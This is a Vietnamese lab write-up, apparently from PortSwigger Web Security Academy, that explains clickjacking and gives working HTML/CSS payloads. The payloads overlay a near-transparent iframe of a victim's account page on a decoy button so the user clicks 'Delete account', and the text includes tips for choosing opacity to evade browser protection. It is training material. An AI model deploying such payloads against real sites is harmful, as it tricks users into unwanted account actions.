# How to construct a basic clickjacking attack? 

Các cuộc tấn công Clickjacking sử dụng CSS để tạo và thao tác các layers. Kẻ tấn công kết hợp trang web mục tiêu như một **iframe layer** được phủ lên trên trang web giải mã. Một ví dụ sử dụng style tag và style parameters như sau:

    <head>
        <style>
            #target_website {
                position:relative;
                width:128px;
                height:128px;
                opacity:0.00001;
                z-index:2;
                }
            #decoy_website {
                position:absolute;
                width:300px;
                height:400px;
                z-index:1;
                }
        </style>
    </head>
    ...
    <body>
        <div id="decoy_website">
        ...decoy web content here...
        </div>
        <iframe id="target_website" src="https://vulnerable-website.com">
        </iframe>
    </body>

# How to construct a basic clickjacking attack - Continued

Clickjacking là một kiểu tấn công mà kẻ tấn công lừa người dùng thực hiện một hành động trên một trang web khác (trang web mục tiêu) mà họ không hề hay biết. Đây là cách mà một cuộc tấn công clickjacking cơ bản được xây dựng:

1. **Nhúng trang web mục tiêu**:

    Kẻ tấn công nhúng trang web mục tiêu (trang muốn bị tấn công) vào bên trong một iframe ẩn. Iframe này chứa các hành động mà kẻ tấn công muốn người dùng vô tình thực hiện (ví dụ: nhấn vào một nút nào đó).

2. **Định vị chính xác**:

    - Iframe được định vị một cách cẩn thận để các phần tử tương tác (ví dụ: nút, liên kết) của nó nằm chính xác ở vị trí chồng lên giao diện của trang web giả mạo do kẻ tấn công tạo ra.

    - Kẻ tấn công sử dụng các giá trị CSS như **width**, **height**, và vị trí (cả tuyệt đối và tương đối) để đảm bảo iframe luôn chồng đúng vị trí bất kể kích thước màn hình, trình duyệt, hay nền tảng sử dụng.

3. **Thứ tự lớp hiển thị (z-index)**:

    Thuộc tính z-index được sử dụng để điều chỉnh thứ tự xếp chồng giữa iframe và các layer của trang web giả mạo, đảm bảo iframe nằm trên các lớp cần thiết.

4. **Làm mờ hoặc ẩn iframe**:

    - Thuộc tính *opacity* của iframe được đặt về 0.0 (hoặc gần 0.0) để nội dung iframe trở nên trong suốt, khiến người dùng không nhìn thấy nó.

    - Một số trình duyệt (ví dụ: Chrome từ phiên bản 76 trở đi) có cơ chế bảo vệ clickjacking, sử dụng phát hiện độ trong suốt của iframe. Nhưng các trình duyệt khác, như Firefox, có thể không có bảo vệ này.

    - Kẻ tấn công chọn giá trị *opacity* phù hợp để đạt được hiệu quả mong muốn mà không kích hoạt cơ chế bảo vệ của trình duyệt.

# Lab: Basic clickjacking with CSRF token protection
![img](https://github.com/DucThinh47/PortSwigger/blob/main/Clickjacking(UI_redressing)/images/image1.png?raw=true)

### Web page
![img](https://github.com/DucThinh47/PortSwigger/blob/main/Clickjacking(UI_redressing)/images/image2.png?raw=true)

### Solution

Log in vào account được cấp wiener:peter

![img](https://github.com/DucThinh47/PortSwigger/blob/main/Clickjacking(UI_redressing)/images/image3.png?raw=true)

Cần tạo payload có dạng như sau để phủ lên web page: 

    <style>
        iframe {
            position:relative;
            width:$width_value;
            height: $height_value;
            opacity: $opacity;
            z-index: 2;
        }
        div {
            position:absolute;
            top:$top_value;
            left:$side_value;
            z-index: 1;
        }
    </style>
    <div>Test me</div>
    <iframe src="YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>

Thay đổi thành: 

    <style>
        iframe {
            position:relative;
            width: 1000px;
            height: 700px;
            opacity: 0.1;
            z-index: 2;
        }
        
        div {
          position: absolute;
          top: 515px;
          z-index: 1;
        }
    </style>
    <div>Click me</div>
    <iframe src="https://0a7400e60385881180282604000b0020.web-security-academy.net/my-account"></iframe>

Cần điều chỉnh để Test me và Delete account button lồng với nhau. Go to exploit server và copy payload vào phần body: 

![img](https://github.com/DucThinh47/PortSwigger/blob/main/Clickjacking(UI_redressing)/images/image4.png?raw=true)

Store và View exploit:

![img](https://github.com/DucThinh47/PortSwigger/blob/main/Clickjacking(UI_redressing)/images/image5.png?raw=true)


Solved the lab!

![img](https://github.com/DucThinh47/PortSwigger/blob/main/Clickjacking(UI_redressing)/images/image6.png?raw=true)







